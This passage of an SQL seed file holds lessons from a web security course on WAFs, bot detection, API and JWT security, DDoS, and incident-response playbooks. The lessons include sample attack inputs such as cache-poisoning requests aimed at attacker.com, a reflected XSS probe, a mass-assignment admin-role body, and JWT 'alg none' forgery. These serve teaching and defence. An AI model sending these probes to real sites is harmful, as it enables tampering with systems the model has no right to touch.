('WAF Fundamentals', 'waf-fundamentals', 3, 'WAF / Bot / API Security', 31, 12, 'intermediate',
'# Web Application Firewall (WAF)

Filter, monitor, and block HTTP traffic to/from web applications.

## How WAF Works
1. Inspect HTTP request
2. Apply rules
3. Allow, block, or challenge
4. Log decision

## Rule Types

### Managed Rulesets
Pre-configured rules (OWASP Core Rule Set)
- SQL injection patterns
- XSS patterns
- Known attack signatures

### Custom Rules
Your own logic
```
IF path contains "/admin" AND country NOT IN (US, CA)
THEN block
```

### Rate Limiting
```
Block IF req/sec > 100 per IP
```

## Positive vs Negative Security

### Negative Security (Blacklist)
Block known bad patterns
- Default: allow all
- Add block rules

### Positive Security (Whitelist)
Allow only known good
- Default: block all
- Add allow rules

## Deployment Modes
- **Inline (blocking)**: Active protection
- **Monitor**: Log only, don''t block',
'["Understand WAF purpose", "Know rule types", "Differentiate positive vs negative security"]',
'["WAF filters HTTP traffic", "Managed rules cover common threats", "Custom rules for specific needs", "Monitor mode for tuning"]',
NULL,
'[13,14,15]'),

-- Day 32
('WAF Tuning & False Positives', 'waf-tuning', 3, 'WAF / Bot / API Security', 32, 14, 'advanced',
'# WAF Tuning

Balance security and false positives.

## False Positive
Legitimate request blocked by WAF

### Example
```
Search query: SELECT * FROM products
→ Triggers SQLi rule
→ User sees 403 Forbidden
```

## Tuning Process

### 1. Start in Monitor Mode
Log without blocking
- Observe patterns
- Identify false positives

### 2. Analyze Logs
```
Blocked: 1000 requests
False positives: 200 (20%)
True attacks: 800 (80%)
```

### 3. Create Exceptions
```
SKIP rule 942100 (SQLi) IF:
- Path = /search
- User-Agent contains "legitimate-bot"
```

### 4. Gradually Enable Blocking
Start with high-confidence rules

### 5. Continuous Monitoring
False positives will emerge with new features

## Best Practices
- **Baseline traffic** before enabling
- **Test in staging** first
- **Whitelist known IPs** (office, partners)
- **Document exceptions** with reasons
- **Review exceptions** periodically
- **Alert on bypass attempts**

## Metrics
- **False Positive Rate**: FP / (FP + TN)
- **False Negative Rate**: FN / (FN + TP)
- **Detection Rate**: TP / (TP + FN)',
'["Understand false positives", "Apply tuning methodology", "Create effective exceptions"]',
'["Start in monitor mode", "Analyze logs systematically", "Whitelist carefully", "Document exceptions", "Continuous tuning required"]',
NULL,
'[31]'),

-- Day 33
('Bot Management Strategies', 'bot-management', 3, 'WAF / Bot / API Security', 33, 15, 'advanced',
'# Bot Management

Distinguish good bots from bad bots.

## Bot Types

### Good Bots
- Search engine crawlers (Googlebot, Bingbot)
- Monitoring services (UptimeRobot, Pingdom)
- Verified partners

### Bad Bots
- Scrapers
- Credential stuffers
- Spam bots
- Inventory hoarders
- Click fraud

## Detection Techniques

### 1. User-Agent Analysis
```
User-Agent: curl/7.68.0  → Suspicious
User-Agent: Mozilla/5.0... (legitimate browser string)
```

### 2. JavaScript Challenge
Send JS that sets a cookie
- Real browsers execute JS
- Simple bots fail

### 3. CAPTCHA
Human verification
- Use for high-risk actions (login, checkout)
- Balance security vs UX

### 4. Behavioral Analysis
- Mouse movements
- Keystroke dynamics
- Session patterns
- Request timing

### 5. TLS Fingerprinting
Identify client based on TLS handshake

### 6. Rate Limiting
```
10 req/sec per IP = likely human
100 req/sec per IP = likely bot
```

## Response Actions
1. **Allow**: Good bot
2. **Monitor**: Uncertain, log for analysis
3. **Challenge**: JS or CAPTCHA
4. **Rate limit**: Slow down
5. **Block**: Known bad bot

## Allowlisting Good Bots
Verify via:
- IP ranges (published by Google, etc.)
- Reverse DNS lookup
- User-Agent + behavior match',
'["Differentiate bot types", "Apply detection techniques", "Choose appropriate responses"]',
'["Not all bots are bad", "Use multiple detection signals", "JS challenge filters simple bots", "Allowlist verified good bots", "Balance security and UX"]',
NULL,
'[31,32]'),

-- Day 34
('API Security Fundamentals', 'api-security-fundamentals', 3, 'WAF / Bot / API Security', 34, 12, 'intermediate',
'# API Security

APIs are critical attack surfaces.

## Common API Threats

### 1. Broken Authentication
- Missing auth on endpoints
- Weak tokens
- Token reuse

### 2. Excessive Data Exposure
```
GET /api/users/123
Returns: {id, name, email, ssn, password_hash}
→ Should only return: {id, name}
```

### 3. Lack of Rate Limiting
```
POST /api/login
→ 10,000 attempts in 1 minute
→ Credential stuffing
```

### 4. Mass Assignment
```
POST /api/users
{
  "name": "Alice",
  "role": "admin"  ← Attacker sets own role
}
```

### 5. BOLA (Broken Object Level Authorization)
```
GET /api/orders/456  ← User 123 accesses User 456''s order
```

## Defense Strategies

### Authentication
- JWT with short expiry
- API keys (rotate regularly)
- OAuth 2.0 for third-party access

### Authorization
Check on every request:
```
IF order.user_id != current_user.id
THEN deny
```

### Rate Limiting
```
Tier 1: 100 req/min
Tier 2: 1000 req/min
Tier 3: 10000 req/min
```

### Input Validation
- Schema validation (JSON Schema, OpenAPI)
- Type checking
- Range checking

### Output Filtering
Only return necessary fields

### Logging
Log all API access with:
- Timestamp
- User ID
- Endpoint
- Parameters
- Response code',
'["Know API-specific threats", "Apply comprehensive API security", "Implement proper authorization"]',
'["APIs need authentication AND authorization", "Rate limiting is critical", "Validate inputs", "Filter outputs", "Log everything"]',
NULL,
'[12,31]'),

-- Day 35
('API Rate Limiting Patterns', 'api-rate-limiting', 3, 'WAF / Bot / API Security', 35, 10, 'intermediate',
'# API Rate Limiting

Control request rates to prevent abuse.

## Algorithms

### 1. Fixed Window
```
Window: 1 minute
Limit: 100 requests
Reset: Every minute at :00
```
**Issue**: Burst at window boundary (199 reqs in 2 seconds)

### 2. Sliding Window
Track requests in rolling time window
**Better**: Smooths out bursts

### 3. Token Bucket
Tokens added at fixed rate
Request consumes token
**Allows**: Short bursts, long-term rate control

### 4. Leaky Bucket
Requests processed at fixed rate
Queue if over limit
**Result**: Smooth, consistent rate

## Implementation

### Per-IP
```
100 req/min per IP
```

### Per-User/API Key
```
Tier 1: 100 req/min
Tier 2: 1000 req/min
```

### Per-Endpoint
```
/api/search: 10 req/sec
/api/user: 100 req/sec
```

### Composite
```
100 req/min per IP
AND
1000 req/min per API key
```

## Response Headers
```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 45
X-RateLimit-Reset: 1609459200
```

## Status Code
```
429 Too Many Requests
Retry-After: 60
```

## Best Practices
- Different limits for read vs write
- Higher limits for authenticated users
- Gradual degradation (429 then block)
- Document limits clearly',
'["Understand rate limiting algorithms", "Implement appropriate limits", "Communicate limits to clients"]',
'["Token bucket is most flexible", "Return rate limit headers", "Use 429 status code", "Different limits per endpoint", "Document your limits"]',
NULL,
'[34]'),

-- Day 36
('DDoS Attack Types & Mitigation', 'ddos-mitigation', 3, 'WAF / Bot / API Security', 36, 14, 'advanced',
'# DDoS: Distributed Denial of Service

Overwhelm system with traffic to make it unavailable.

## Attack Layers

### L3/L4 (Network/Transport)
**Volume-based attacks**

#### UDP Flood
Send massive UDP packets
- No handshake required
- Easy to spoof source

#### SYN Flood
Send SYNs without completing handshake
- Exhaust connection table
- Server holds half-open connections

#### DNS Amplification
Query open DNS resolvers
- Small request → Large response
- Amplification factor: 50x-100x

**Mitigation**:
- Rate limiting
- SYN cookies
- Anycast (distribute attack)
- BGP blackholing
- Cloud scrubbing centers

### L7 (Application)
**Resource-intensive requests**

#### HTTP Flood
Massive GET/POST requests
- Appears legitimate
- Exhaust application resources

#### Slowloris
Open many connections
- Send headers slowly
- Keep connections alive
- Exhaust connection pool

#### API Abuse
Target expensive endpoints
```
GET /api/search?q=* (heavy query)
```

**Mitigation**:
- WAF rate limiting
- Challenge (JS, CAPTCHA)
- Prioritize known good users
- Caching
- Scale horizontally

## Defense Architecture
1. **CDN/Edge**: Absorb attack, rate limit
2. **WAF**: Filter malicious requests
3. **Origin Protection**: Whitelist CDN IPs only
4. **Auto-scaling**: Handle legitimate spikes
5. **Monitoring**: Detect anomalies fast

## Best Practices
- **Always-on DDoS protection** (not on-demand)
- **Baseline traffic** to detect anomalies
- **Runbook** for DDoS response
- **Test failover** regularly',
'["Understand DDoS attack types", "Know layer-specific mitigations", "Architect resilient systems"]',
'["DDoS targets availability", "L3/L4 = volume, L7 = application", "CDN absorbs attacks", "Rate limiting is key", "Always-on protection"]',
NULL,
'[4,31,33]'),

-- Day 37
('API Schema Validation', 'api-schema-validation', 3, 'WAF / Bot / API Security', 37, 10, 'intermediate',
'# API Schema Validation

Ensure API requests/responses match expected structure.

## Why Schema Validation?

### Security
- Prevent injection attacks
- Block malformed requests
- Enforce data types

### Reliability
- Catch integration errors early
- Document API contract
- Prevent breaking changes

## OpenAPI (Swagger)
Define API schema in YAML/JSON

### Example
```yaml
paths:
  /api/users:
    post:
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              required:
                - username
                - email
              properties:
                username:
                  type: string
                  minLength: 3
                  maxLength: 20
                email:
                  type: string
                  format: email
                age:
                  type: integer
                  minimum: 0
                  maximum: 150
```

## Validation Points

### Request Validation
- Check required fields
- Validate types
- Enforce constraints (min/max, regex)
- Reject extra fields (strict mode)

### Response Validation
Ensure your API returns correct structure
- Catch bugs before production
- Maintain consistency

## Implementation

### Server-side (Hono example)
```typescript
import { validator } from ''hono/validator''

app.post(''/api/users'',
  validator(''json'', (value, c) => {
    if (!value.username || value.username.length < 3) {
      return c.text(''Invalid username'', 400)
    }
    return value
  }),
  async (c) => {
    const data = c.req.valid(''json'')
    // Process validated data
  }
)
```

### Error Responses
```json
{
  "error": "Validation failed",
  "details": [
    {
      "field": "email",
      "message": "Invalid email format"
    },
    {
      "field": "age",
      "message": "Must be between 0 and 150"
    }
  ]
}
```

## Best Practices
- **Fail closed**: Reject invalid requests
- **Clear error messages**: Help developers
- **Version your API**: /v1, /v2
- **Validate early**: Before business logic
- **Test edge cases**: Null, empty, huge values',
'["Understand schema validation benefits", "Define API schemas", "Implement validation"]',
'["Schema validation improves security", "Define schemas with OpenAPI", "Validate requests AND responses", "Reject invalid data", "Clear error messages"]',
NULL,
'[34,35]'),

-- Day 38
('JWT Security Best Practices', 'jwt-security', 3, 'WAF / Bot / API Security', 38, 12, 'advanced',
'# JWT Security

JSON Web Tokens for stateless authentication.

## JWT Structure
```
header.payload.signature
```

### Header
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload
```json
{
  "sub": "user123",
  "role": "admin",
  "exp": 1609459200
}
```

### Signature
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

## Security Threats

### 1. Algorithm Confusion
Change "alg" from RS256 to HS256
- Use public key as HMAC secret
- Forge tokens

**Fix**: Explicitly set expected algorithm

### 2. None Algorithm
```json
{"alg": "none"}
```
Accept unsigned tokens

**Fix**: Reject alg=none

### 3. Weak Secret
Short HMAC secret → Brute force

**Fix**: Use 256+ bit secret

### 4. No Expiration
Token valid forever

**Fix**: Always set "exp" claim

### 5. Token Leakage
Stored in localStorage (XSS risk)

**Fix**: HttpOnly cookies (when possible)

## Best Practices

### 1. Short Expiration
```
Access token: 15 minutes
Refresh token: 7 days (revocable)
```

### 2. Strong Algorithm
```
HS256: 256-bit secret
RS256: 2048+ bit key pair (preferred)
```

### 3. Validate Claims
```
- Signature valid?
- Not expired?
- Issuer correct?
- Audience correct?
```

### 4. Rotate Secrets
Change signing keys periodically

### 5. Revocation Strategy
- Blacklist (store revoked tokens)
- Short expiry + refresh tokens
- Version number in token

### 6. HTTPS Only
JWTs contain sensitive data

## Refresh Token Pattern
```
1. Login → Access (15min) + Refresh (7d)
2. Access expires → Use refresh to get new access
3. Refresh compromised → Revoke it
```',
'["Understand JWT structure", "Recognize JWT attacks", "Apply security best practices"]',
'["Validate algorithm explicitly", "Reject alg=none", "Short expiration + refresh tokens", "Use RS256 for production", "HTTPS always"]',
NULL,
'[12,34]'),

-- Day 39
('Advanced Bot Detection', 'advanced-bot-detection', 3, 'WAF / Bot / API Security', 39, 14, 'advanced',
'# Advanced Bot Detection

Beyond basic User-Agent checks.

## Machine Learning Signals

### Behavioral Biometrics
- **Mouse movements**: Bots = linear, Humans = curved
- **Keystroke dynamics**: Timing between keypresses
- **Scroll patterns**: Bots = instant, Humans = gradual
- **Session duration**: Bots = quick, Humans = varied

### Session Analysis
- **Pages per session**: Bots = targeted, Humans = exploratory
- **Time on page**: Bots = 0s, Humans = 5-60s
- **Referrer**: Bots = none/same, Humans = varied

## TLS Fingerprinting
Identify client by TLS Client Hello parameters
- Cipher suites
- Extensions
- Supported curves

### JA3 Hash
```
JA3 = MD5(SSLVersion,Ciphers,Extensions,EllipticCurves,ECFormats)
```

Known bot fingerprints can be blocked

## Device Fingerprinting
Combine signals:
- Screen resolution
- Timezone
- Installed fonts
- Canvas fingerprint
- WebGL fingerprint
- Audio fingerprint

## Challenge-Response

### Invisible CAPTCHA
Monitor behavior, challenge only suspicious

### Proof of Work
Require CPU work (HashCash)
- Expensive for bots at scale
- Minimal impact on humans

### Time-based Tokens
Token valid only for short window
- Bots reuse tokens
- Legitimate users get fresh tokens

## Honeypots
Hidden fields/links only bots see
```html
<input type="text" name="email2" style="display:none">
```
If filled → Bot

## Distributed Detection
Share threat intelligence
- Cloudflare Bot Management
- Akamai Bot Manager
- PerimeterX/HUMAN

## Response Strategy

### Scoring System
```
Score = 0 (definitely bot) to 100 (definitely human)

0-20: Block
21-40: CAPTCHA
41-60: Rate limit
61-80: Monitor
81-100: Allow
```

### Adaptive Challenges
Increase difficulty if suspicious:
1. JS challenge
2. Invisible CAPTCHA
3. CAPTCHA
4. Block',
'["Apply advanced bot detection", "Use multiple signals", "Implement scoring system"]',
'["User-Agent alone is insufficient", "Behavioral analysis is powerful", "TLS fingerprinting effective", "Combine multiple signals", "Adaptive challenges balance UX"]',
NULL,
'[33,38]'),

-- Day 40
('API Gateway Security', 'api-gateway-security', 3, 'WAF / Bot / API Security', 40, 12, 'advanced',
'# API Gateway Security

Centralized control point for APIs.

## API Gateway Roles

### 1. Authentication & Authorization
Single point for auth
```
Client → Gateway (auth) → Backend (no auth needed)
```

### 2. Rate Limiting
Enforce limits before reaching backend

### 3. Request/Response Transformation
- Add headers
- Remove sensitive data
- Format conversion

### 4. Caching
Cache responses to reduce backend load

### 5. Load Balancing
Distribute across backend instances

### 6. Monitoring & Logging
Centralized visibility

## Security Features

### API Key Management
```
X-API-Key: abc123xyz
```
- Generate per client
- Rotate regularly
- Revoke compromised keys

### JWT Validation
Validate before passing to backend
```
1. Check signature
2. Check expiration
3. Check claims
4. Pass user info to backend in header
```

### IP Whitelisting
```
Only allow:
- Partner IPs
- Office IPs
- Authenticated users
```

### Request Validation
- Schema validation
- Size limits (prevent large payload DoS)
- Content-Type check

### Response Filtering
Remove sensitive headers:
- X-Powered-By
- Server
- Internal error details

### TLS Termination
- Gateway handles TLS
- Backend can be HTTP (if in secure network)
- Or mutual TLS to backend

## Deployment Patterns

### Edge Gateway
At CDN/WAF layer
- Global distribution
- DDoS protection

### Regional Gateway
Per region/datacenter
- Lower latency
- Data residency

### Service Mesh
Per microservice
- Fine-grained control
- Zero-trust networking

## Best Practices
- **Defense in depth**: Gateway + backend validation
- **Fail securely**: Default deny
- **Monitor all requests**: Full logging
- **Version your APIs**: /v1, /v2
- **Document security**: OAuth flows, rate limits
- **Test regularly**: Penetration testing',
'["Understand API gateway role", "Configure security features", "Apply best practices"]',
'["Gateway is central control point", "Validate at gateway AND backend", "Centralized auth simplifies", "Monitor all gateway traffic", "Defense in depth"]',
NULL,
'[34,35,38]');


-- =====================================================
-- PHASE 4: INCIDENT RESPONSE SIMULATIONS (10 lessons)
-- =====================================================

INSERT INTO lessons (title, slug, phase, phase_name, day_number, reading_time_min, difficulty, content, objectives, key_takeaways, micro_lab, prerequisites) VALUES

-- Day 41
('Incident Detection & Triage', 'incident-detection', 4, 'Real-time Incident Handling', 41, 12, 'advanced',
'# Incident Detection & Triage

Fast, accurate detection is critical.

## Detection Sources

### Monitoring & Alerts
- Error rate spike (5xx > 1%)
- Latency increase (P95 > 2s)
- Traffic anomaly (10x normal)
- Cache hit ratio drop (<70%)

### Security Tools
- WAF blocks spike
- DDoS protection triggered
- IDS/IPS alerts
- SIEM correlation

### User Reports
- "Site is slow"
- "I can''t login"
- "Getting errors"

### Threat Intelligence
- New vulnerability disclosed
- Attack campaign observed

## Triage Process

### 1. Initial Assessment (5 min)
- **What**: Type of incident (DDoS, data breach, outage)
- **When**: Started when?
- **Where**: What systems/services affected?
- **Who**: Users impacted (all, subset, region)?
- **Impact**: Severity (critical, high, medium, low)

### 2. Severity Classification

#### Critical (P0)
- Complete outage
- Data breach
- Payment processing down
Response time: Immediate

#### High (P1)
- Partial outage
- Performance severely degraded
- Auth system impacted
Response time: 15 minutes

#### Medium (P2)
- Isolated issue
- Workaround available
Response time: 1 hour

#### Low (P3)
- Minor issue
- No user impact
Response time: Next business day

### 3. Initial Response
- Notify incident commander
- Assemble response team
- Create incident channel (Slack, Teams)
- Start logging timeline

## Key Questions
1. Is this an attack or operational issue?
2. Is data at risk?
3. Is the issue contained or spreading?
4. What''s the blast radius?
5. Can we fail over / isolate?

## Common Pitfalls
- Assuming vs investigating
- Changing too many things at once
- Poor communication
- Not documenting actions',
'["Detect incidents quickly", "Triage effectively", "Classify severity accurately"]',
'["Fast detection saves damage", "Triage determines priority", "Document from minute 1", "Communicate clearly", "Don''t assume"]',
NULL,
'[20,36]'),

-- Day 42
('DDoS Incident Response', 'ddos-incident-response', 4, 'Real-time Incident Handling', 42, 14, 'advanced',
'# DDoS Incident Response Playbook

Step-by-step DDoS handling.

## Detection Signals
- Traffic spike (10x-100x normal)
- Latency increase across all endpoints
- Origin server CPU/bandwidth maxed
- Specific HTTP patterns (same User-Agent, URI)

## Response Steps

### 1. Confirm DDoS (2 min)
Check:
- Traffic sources: Distributed IPs?
- Request patterns: Repetitive?
- Legitimate users affected: Yes
- Origin under load: Yes

### 2. Activate DDoS Protection (5 min)
- **CDN**: Enable DDoS mitigation mode
- **WAF**: Aggressive rate limiting
- **Challenge**: JS challenge for all requests (temporary)

### 3. Analyze Attack Pattern (10 min)
```
Attack type:
- L3/L4: UDP/SYN flood → Network-level mitigation
- L7: HTTP flood → WAF rules

Target:
- Homepage: Enable aggressive caching
- API: Rate limit per IP/key
- Login: CAPTCHA required

Source:
- Botnet: Blocking impossible, rate limit
- Single ASN: Block at edge
```

### 4. Implement Mitigations (15 min)
```
# Rate limiting
100 req/sec per IP globally
10 req/sec per IP to /api/expensive

# Geographic blocking (if applicable)
Block countries with no legitimate traffic

# Challenge
JS challenge score < 30 → Block

# Cache everything possible
Even dynamic content temporarily
```

### 5. Monitor Effectiveness (Ongoing)
Every 5 min check:
- Legitimate traffic recovering?
- Attack traffic blocked?
- Origin load decreasing?

### 6. Communicate
- **Internal**: Incident channel updates
- **External**: Status page if prolonged
- **Customers**: Proactive notification

### 7. Scale if Needed
- Auto-scale origin (if not hidden)
- Activate additional DDoS scrubbing
- Contact CDN provider for assistance

## Common Attacks

### HTTP Flood
Massive GET/POST requests
**Mitigation**: Rate limit, challenge, cache

### Slowloris
Slow, incomplete requests
**Mitigation**: Connection timeout, rate limit

### API Abuse
Target expensive endpoints
**Mitigation**: Endpoint-specific rate limits

## Post-Incident
- Document attack pattern
- Update WAF rules
- Review capacity planning
- Improve monitoring',
'["Respond to DDoS systematically", "Apply appropriate mitigations", "Monitor effectiveness"]',
'["Confirm it''s DDoS first", "Enable protection early", "Rate limiting is key", "Cache aggressively", "Monitor and adjust", "Document for next time"]',
NULL,
'[36,41]'),

-- Day 43
('Credential Stuffing Response', 'credential-stuffing-response', 4, 'Real-time Incident Handling', 43, 12, 'advanced',
'# Credential Stuffing Incident Response

Attackers test stolen username/password pairs.

## Detection Signals
- Login attempts spike (10x-100x)
- Low success rate (1-5%)
- Distributed IPs (botnet)
- Repeated usernames with different passwords
- User reports: "Locked out" or "Account accessed"

## Response Steps

### 1. Confirm Attack (5 min)
```
Metrics to check:
- Login endpoint: req/sec > 10x normal
- Failed login rate: >95%
- Unique IPs: Thousands
- User-Agents: Repetitive or scripted
```

### 2. Immediate Containment (10 min)
```
# Rate limiting
5 login attempts per IP per minute
3 login attempts per username per hour

# CAPTCHA
Require after 3 failed attempts

# Block known attack IPs
Use threat intelligence feeds
```

### 3. Identify Compromised Accounts (30 min)
```sql
SELECT username, COUNT(*) as attempts, 
       SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END) as successes
FROM login_attempts
WHERE timestamp > NOW() - INTERVAL 1 HOUR
GROUP BY username
HAVING successes > 0 AND attempts > 10
```

### 4. Protect Compromised Accounts
- Force password reset
- Invalidate all sessions
- Email user about suspicious activity
- Enable MFA if not already

### 5. Enhanced Monitoring
- Monitor for account takeover activities:
  - Password changes
  - Email changes
  - Unusual purchases/transfers
  - Data exports

### 6. Long-term Mitigations
- **MFA**: Require for all users
- **Password strength**: Enforce complex passwords
- **Breach detection**: Check passwords against HaveIBeenPwned
- **Device fingerprinting**: Challenge unknown devices
- **Behavioral analysis**: Flag unusual login patterns

## Communication
- **Internal**: Security team, customer support
- **Affected users**: Email notification
- **All users**: Optional security reminder

## Post-Incident
- **Count**: How many accounts compromised?
- **Forensics**: Attack source, tools used
- **Improvements**: What mitigations worked?',
'["Detect credential stuffing", "Contain attack quickly", "Protect compromised accounts"]',
'["Credential stuffing = stolen credentials", "Rate limiting + CAPTCHA stops bots", "Identify compromised accounts fast", "Force password reset", "MFA prevents future attacks"]',
NULL,
'[33,39,41]'),

-- Day 44
('False Positive Incident', 'false-positive-incident', 4, 'Real-time Incident Handling', 44, 10, 'advanced',
'# False Positive Incident Response

WAF blocking legitimate users.

## Detection
- Customer reports: "Can''t access site"
- Support tickets spike
- Specific user segment affected (mobile, region, browser)
- Revenue drop (if blocking checkout)

## Response Steps

### 1. Confirm False Positive (5 min)
```
Check WAF logs:
- Rule triggered: Which one?
- Request pattern: Legitimate?
- User segment: All users or specific?
- Business impact: Revenue, conversions affected?
```

### 2. Immediate Mitigation (10 min)
```
Option A: Disable offending rule
(if confident it''s false positive)

Option B: Create exception
IF path = "/checkout" AND rule = 942100
THEN skip rule

Option C: Lower sensitivity
Change paranoia level from 3 to 2
```

### 3. Communicate
- **Support team**: Issue identified, ETA for fix
- **Affected users**: Email/notification if known
- **Leadership**: If revenue impact

### 4. Verify Fix (10 min)
- Test affected flow personally
- Check support tickets decreasing
- Monitor error rates normalizing

### 5. Root Cause Analysis (30 min)
```
Why false positive?
- New feature deployed (legitimate behavior changed)
- WAF rule too aggressive
- Edge case not tested
- User input format changed
```

### 6. Prevent Recurrence
- Add test case for this scenario
- Update WAF tuning process
- Improve staging environment testing
- Document exception with reason

## Common False Positives

### SQL Injection Rule
Triggered by: Search queries with SQL keywords
```
Search: "SELECT best laptop"
→ Blocked by SQLi rule
```
**Fix**: Exclude search endpoint with input validation

### XSS Rule
Triggered by: User-generated content
```
Comment: "<3 this product!"
→ Blocked by XSS rule
```
**Fix**: Context-aware escaping + exception

### File Upload Rule
Triggered by: Legitimate file extensions
```
Upload: report.exe
→ Blocked by malware rule
```
**Fix**: Whitelist specific content types

## Balance
Security vs Usability
- Too strict → False positives → Bad UX
- Too loose → False negatives → Security incidents

Tuning is continuous.',
'["Detect false positives quickly", "Mitigate with minimal risk", "Prevent recurrence"]',
'["False positives hurt UX and revenue", "Create specific exceptions", "Test in staging first", "Document all exceptions", "Balance security and usability"]',
NULL,
'[32,41]'),

-- Day 45
('API Abuse Incident', 'api-abuse-incident', 4, 'Real-time Incident Handling', 45, 12, 'advanced',
'# API Abuse / Scraping Incident

Detecting and stopping API abuse.

## Detection Signals
- API traffic spike (specific endpoint)
- Unusual request patterns (sequential IDs)
- Single API key/IP high volume
- Data export endpoint hit repeatedly
- Database load increased

## Response Steps

### 1. Confirm Abuse (10 min)
```
Check:
- Is it single actor or distributed?
- Which endpoints targeted?
- What data being accessed?
- Is it a legitimate partner gone rogue?
- Business impact?
```

### 2. Identify Actor (15 min)
```
Pivot on:
- API key: Who owns it?
- IP address: Organization?
- User-Agent: Bot signature?
- Request pattern: Automated?

Example query:
SELECT api_key, COUNT(*) as requests
FROM api_logs
WHERE timestamp > NOW() - INTERVAL 1 HOUR
  AND endpoint = ''/api/products''
GROUP BY api_key
ORDER BY requests DESC
LIMIT 10
```

### 3. Immediate Containment (10 min)
```
# Revoke API key
Rate limit to 0 req/min

# Block IP range
If no API key used

# Endpoint rate limit
Reduce global limit temporarily
/api/products: 100 → 10 req/min
```

### 4. Assess Damage (30 min)
```
What data accessed?
- Public data: Low impact
- PII: High impact, breach notification?
- Competitive data: Business risk

How much data?
- Query logs for volume
- Check data export patterns
```

### 5. Long-term Mitigations
```
# Pagination limits
Max 100 items per request

# Rate limiting
Per API key + per endpoint

# Authentication
Require auth for sensitive endpoints

# Data masking
Redact sensitive fields in responses

# Monitoring
Alert on unusual patterns:
- Sequential ID enumeration
- Bulk export attempts
- Unusual time (3 AM)
```

### 6. Communication
- **Actor**: If legitimate partner, discuss proper usage
- **Legal**: If TOS violation, C&D letter
- **Internal**: Security, product, leadership
- **Users**: If PII exposed, notification required

## Common Abuse Patterns

### Scraping
Extract all product data
**Mitigation**: Rate limit, challenge, obfuscation

### Enumeration
Guess object IDs to access
```
GET /api/orders/1
GET /api/orders/2
GET /api/orders/3
```
**Mitigation**: Use UUIDs, not sequential IDs

### Token Reuse
Single stolen API key used at scale
**Mitigation**: Rotate keys, bind to IP

## Prevention
- **API design**: Use UUIDs
- **Rate limiting**: From day 1
- **Monitoring**: Baseline + alerts
- **Terms of Service**: Clear acceptable use
- **Key rotation**: Regular schedule',
'["Detect API abuse", "Contain quickly", "Mitigate long-term"]',
'["API abuse drains resources", "Identify actor via logs", "Revoke keys immediately", "Use UUIDs not sequential IDs", "Rate limit everything"]',
NULL,
'[34,35,41]'),

-- Day 46
('Cache Poisoning Response', 'cache-poisoning-response', 4, 'Real-time Incident Handling', 46, 10, 'advanced',
'# Cache Poisoning Incident Response

Malicious content cached at CDN.

## Detection
- User reports: "Site looks weird" or "Seeing wrong content"
- Content includes unexpected links/scripts
- Multiple users see same malicious content
- Referer from attacker domain

## Response Steps

### 1. Confirm Poisoning (5 min)
```
Check:
- Cached object contains malicious content?
- Multiple users affected?
- Cache key predictable?
- How was it injected?
```

### 2. Immediate Purge (5 min)
```
# Purge affected objects
Purge /page.html
Purge /api/data.json

# If unsure, purge all
Purge all cache

Risk: Origin load spike, but necessary
```

### 3. Block Injection Vector (15 min)
```
Common vectors:

# Unkeyed header
X-Forwarded-Host: attacker.com
→ Response includes attacker.com link
→ Fix: Don''t reflect unkeyed headers

# Parameter pollution
/?callback=malicious()
→ Fix: Validate callback parameter

# Fat GET
GET /page HTTP/1.1
Host: example.com
X-Override-Host: attacker.com
→ Fix: Ignore X-Override-Host
```

### 4. Fix Cache Key (30 min)
```
Include relevant headers in cache key:
- Host header
- Authorization (if varies)
- Accept-Language (if varies)

Exclude dangerous headers:
- X-Forwarded-Host
- X-Forwarded-For
- Custom headers (unless needed)
```

### 5. Add Input Validation (1 hour)
```
# Validate all reflected inputs
function sanitize(input) {
  return input.replace(/[<>"'']/g, \'\');
}

# Use Content-Security-Policy
Content-Security-Policy: default-src ''self''
```

### 6. Monitor for Recurrence
```
Alert on:
- Cache purge frequency spike
- Unusual cached responses
- Requests with suspicious headers
```

## Common Scenarios

### XSS via Cached Response
```
GET /search?q=<script>alert(1)</script>
Response: You searched for <script>alert(1)</script>
→ Cached, served to all users
```

### Redirect via Host Header
```
GET / HTTP/1.1
Host: attacker.com
Response: Location: https://attacker.com/malicious
→ Cached, all users redirected
```

## Prevention
- **Normalize cache keys**
- **Validate inputs**
- **Output encoding**
- **Short TTL for dynamic content**
- **CSP headers**
- **Regular security testing**',
'["Detect cache poisoning", "Purge immediately", "Fix injection vector"]',
'["Cache poisoning affects all users", "Purge cache immediately", "Fix cache key configuration", "Validate all inputs", "Output encode all responses"]',
NULL,
'[28,41]'),

-- Day 47
('Origin Failure Response', 'origin-failure-response', 4, 'Real-time Incident Handling', 47, 12, 'advanced',
'# Origin Failure Incident Response

Origin server down or degraded.

## Detection
- 5xx errors spike
- CDN health check failing
- Slow response times (>10s)
- Complete outage (connection refused)

## Response Steps

### 1. Assess Scope (5 min)
```
Check:
- All origins down or partial?
- Specific endpoints or all?
- Database issue or application?
- Traffic spike caused it?
```

### 2. Immediate Actions (10 min)
```
# Serve stale content
Enable stale-while-error
Serve from cache even if origin down

# Failover
Switch to backup origin/region

# Maintenance page
If no cached content available
Return custom 503 page
```

### 3. Diagnose Root Cause (15 min)
```
Common causes:

# Database overload
→ Scale up, add replicas, optimize queries

# Memory exhaustion
→ Restart with more memory, fix leaks

# Disk full
→ Clean up logs, add storage

# DDoS hitting origin
→ Check CDN bypass, tighten firewall

# Code deployment issue
→ Rollback

# External dependency down
→ Implement circuit breaker
```

### 4. Restore Service (Variable)
```
# Quick wins
- Restart application
- Rollback deployment
- Failover to backup

# If need time
- Keep serving stale
- Return cached responses only
- Maintenance page for uncached
```

### 5. Communication
```
# Internal
- Engineering team
- Customer support
- Leadership

# External (if prolonged)
- Status page update
- Social media notification
- Email to critical customers
```

### 6. Monitor Recovery
```
Check every 5 min:
- 5xx rate decreasing?
- Response time normalizing?
- Database load healthy?
- Cache hit ratio recovering?
```

## CDN Features to Use

### Stale Content
```
Cache-Control: max-age=3600, stale-while-revalidate=86400, stale-if-error=86400
```
Serve stale if origin down

### Custom Error Pages
```
503 page with:
- Status update
- ETA
- Support contact
```

### Health-based Routing
Automatic failover to healthy origin

## Post-Incident
- **Root cause**: Document clearly
- **Prevention**: What can stop recurrence?
- **Monitoring**: Add alerts for early detection
- **Runbook**: Update procedures

## Prevention
- **Redundancy**: Multiple origins
- **Auto-scaling**: Handle traffic spikes
- **Health checks**: Detect issues fast
